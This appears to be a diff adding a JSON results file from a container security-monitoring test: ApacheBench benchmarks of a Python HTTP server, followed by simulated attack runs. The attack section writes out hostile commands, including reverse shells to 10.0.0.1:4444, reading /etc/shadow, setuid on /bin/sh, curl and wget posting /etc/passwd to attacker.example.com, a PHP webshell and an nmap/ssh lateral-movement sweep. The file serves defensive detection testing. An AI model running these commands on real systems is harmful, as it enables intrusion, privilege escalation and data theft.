@@ -1,0 +1,274 @@
+{
+  "python-http": {
+    "workload": "python-http",
+    "timestamp": "2026-01-05T10:22:45.953577",
+    "container_config": {
+      "image": "python:3.11-slim",
+      "name": "wasmsentinel-python",
+      "ports": {
+        "8000": "18000"
+      },
+      "env": {},
+      "command": "python -m http.server 8000",
+      "healthcheck": null,
+      "volumes": {}
+    },
+    "phases": {
+      "baseline": {
+        "elapsed_seconds": 7.5184173583984375,
+        "stdout": "This is ApacheBench, Version 2.3 <$Revision: 1903618 $>\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\nLicensed to The Apache Software Foundation, http://www.apache.org/\n\nBenchmarking localhost (be patient)\n\n\nServer Software:        SimpleHTTP/0.6\nServer Hostname:        localhost\nServer Port:            18000\n\nDocument Path:          /\nDocument Length:        877 bytes\n\nConcurrency Level:      50\nTime taken for tests:   7.507 seconds\nComplete requests:      10000\nFailed requests:        0\nTotal transferred:      10330000 bytes\nHTML transferred:       8770000 bytes\nRequests per second:    1332.10 [#/sec] (mean)\nTime per request:       37.535 [ms] (mean)\nTime per request:       0.751 [ms] (mean, across all concurrent requests)\nTransfer rate:          1343.81 [Kbytes/sec] received\n\nConnection Times (ms)\n              min  mean[+/-sd] median   max\nConnect:        0    0   0.1      0       2\nProcessing:     2   34 176.2      9    2897\nWaiting:        1   34 176.2      8    2896\nTotal:          3   34 176.2      9    2899\n\nPercentage of the requests served within a certain time (ms)\n  50%      9\n  66%     10\n  75%     11\n  80%     11\n  90%     13\n  95%     14\n  98%   1014\n  99%   1049\n 100%   2899 (longest request)\n",
+        "stderr": "Completed 1000 requests\nCompleted 2000 requests\nCompleted 3000 requests\nCompleted 4000 requests\nCompleted 5000 requests\nCompleted 6000 requests\nCompleted 7000 requests\nCompleted 8000 requests\nCompleted 9000 requests\nCompleted 10000 requests\nFinished 10000 requests\n",
+        "returncode": 0,
+        "stats_before": {
+          "cpu_percent": 0.01,
+          "memory": "15.98MiB / 125.7GiB",
+          "network": "3.58kB / 126B"
+        },
+        "stats_after": {
+          "cpu_percent": 0.01,
+          "memory": "16.71MiB / 125.7GiB",
+          "network": "4.9MB / 14.4MB"
+        }
+      },
+      "monitored": {
+        "elapsed_seconds": 7.5335533618927,
+        "stdout": "This is ApacheBench, Version 2.3 <$Revision: 1903618 $>\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\nLicensed to The Apache Software Foundation, http://www.apache.org/\n\nBenchmarking localhost (be patient)\n\n\nServer Software:        SimpleHTTP/0.6\nServer Hostname:        localhost\nServer Port:            18000\n\nDocument Path:          /\nDocument Length:        877 bytes\n\nConcurrency Level:      50\nTime taken for tests:   7.523 seconds\nComplete requests:      10000\nFailed requests:        0\nTotal transferred:      10330000 bytes\nHTML transferred:       8770000 bytes\nRequests per second:    1329.25 [#/sec] (mean)\nTime per request:       37.615 [ms] (mean)\nTime per request:       0.752 [ms] (mean, across all concurrent requests)\nTransfer rate:          1340.94 [Kbytes/sec] received\n\nConnection Times (ms)\n              min  mean[+/-sd] median   max\nConnect:        0    0   0.1      0       3\nProcessing:     2   34 193.1      9    3758\nWaiting:        2   33 193.1      8    3758\nTotal:          2   34 193.1      9    3760\n\nPercentage of the requests served within a certain time (ms)\n  50%      9\n  66%     10\n  75%     11\n  80%     11\n  90%     13\n  95%     15\n  98%     23\n  99%   1036\n 100%   3760 (longest request)\n",
+        "stderr": "Completed 1000 requests\nCompleted 2000 requests\nCompleted 3000 requests\nCompleted 4000 requests\nCompleted 5000 requests\nCompleted 6000 requests\nCompleted 7000 requests\nCompleted 8000 requests\nCompleted 9000 requests\nCompleted 10000 requests\nFinished 10000 requests\n",
+        "returncode": 0,
+        "stats_before": {
+          "cpu_percent": 0.01,
+          "memory": "16.7MiB / 125.7GiB",
+          "network": "4.9MB / 14.4MB"
+        },
+        "stats_after": {
+          "cpu_percent": 0.01,
+          "memory": "17.79MiB / 125.7GiB",
+          "network": "9.8MB / 28.7MB"
+        },
+        "monitoring": "simulated"
+      },
+      "attacks": {
+        "reverse_shell_attempt": {
+          "name": "Reverse Shell Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "bash -c \"exec 5<>/dev/tcp/10.0.0.1/4444 2>/dev/null\" || true",
+              "returncode": -1,
+              "elapsed_ms": 10040.943145751953,
+              "stdout": "",
+              "stderr": "Timeout"
+            },
+            {
+              "command": "python3 -c \"import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))\" 2>/dev/null || true",
+              "returncode": -1,
+              "elapsed_ms": 10051.801204681396,
+              "stdout": "",
+              "stderr": "Timeout"
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "dup2",
+            "execve"
+          ]
+        },
+        "privilege_escalation": {
+          "name": "Privilege Escalation",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "sudo -n id 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 66.2984848022461,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "cat /etc/shadow 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 65.40608406066895,
+              "stdout": "root:*:20451:0:99999:7:::\ndaemon:*:20451:0:99999:7:::\nbin:*:20451:0:99999:7:::\nsys:*:20451:0:99999:7:::\nsync:*:20451:0:99999:7:::\ngames:*:20451:0:99999:7:::\nman:*:20451:0:99999:7:::\nlp:*:20451:0:99999",
+              "stderr": ""
+            },
+            {
+              "command": "chmod u+s /bin/sh 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 63.20548057556152,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "setuid",
+            "setgid",
+            "execve",
+            "openat"
+          ]
+        },
+        "container_escape": {
+          "name": "Container Escape Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "cat /proc/1/cgroup 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 57.5718879699707,
+              "stdout": "0::/\n",
+              "stderr": ""
+            },
+            {
+              "command": "ls -la /var/run/docker.sock 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 64.17703628540039,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "mount --bind / /mnt 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 64.56232070922852,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "mount",
+            "pivot_root"
+          ]
+        },
+        "data_exfiltration": {
+          "name": "Data Exfiltration",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "curl -s http://attacker.example.com/exfil -d @/etc/passwd 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 59.026479721069336,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "wget -q --post-file=/etc/passwd http://attacker.example.com/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 58.50815773010254,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "read",
+            "socket",
+            "connect",
+            "sendto"
+          ]
+        },
+        "cryptominer_behavior": {
+          "name": "Cryptominer Behavior",
+          "severity": "medium",
+          "commands": [
+            {
+              "command": "dd if=/dev/zero of=/dev/null bs=1M count=1000 2>/dev/null &",
+              "returncode": 0,
+              "elapsed_ms": 65.38724899291992,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "for i in $(seq 1 4); do sha256sum /dev/zero & done; sleep 5; pkill sha256sum 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 7076.770067214966,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "clone",
+            "sched_setaffinity",
+            "read",
+            "write"
+          ]
+        },
+        "webshell_upload": {
+          "name": "Webshell Upload Simulation",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "echo \"<?php system($_GET[cmd]); ?>\" > /tmp/shell.php 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 89.42604064941406,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "curl -X POST -F \"file=@/tmp/shell.php\" http://localhost/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 59.8750114440918,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "write",
+            "socket",
+            "sendto"
+          ]
+        },
+        "lateral_movement": {
+          "name": "Lateral Movement",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "ping -c 1 172.17.0.1 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 62.601566314697266,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "nmap -sP 172.17.0.0/24 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 64.23497200012207,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "ssh -o ConnectTimeout=1 root@172.17.0.2 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 67.62218475341797,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "sendto",
+            "recvfrom"
+          ]
+        }
+      },
+      "overhead": {
+        "cpu_samples": [
+          405.22,
+          406.13,
+          404.91,
+          405.21,
+          403.84,
+          404.21,
+          403.52,
+          405.54,
+          405.22,
+          408.94
+        ],
+        "cpu_mean": 405.274,
+        "cpu_stdev": 1.5147585066053761
+      }
+    },
+    "overhead_percent": 0.20131901133893615
+  }
+}
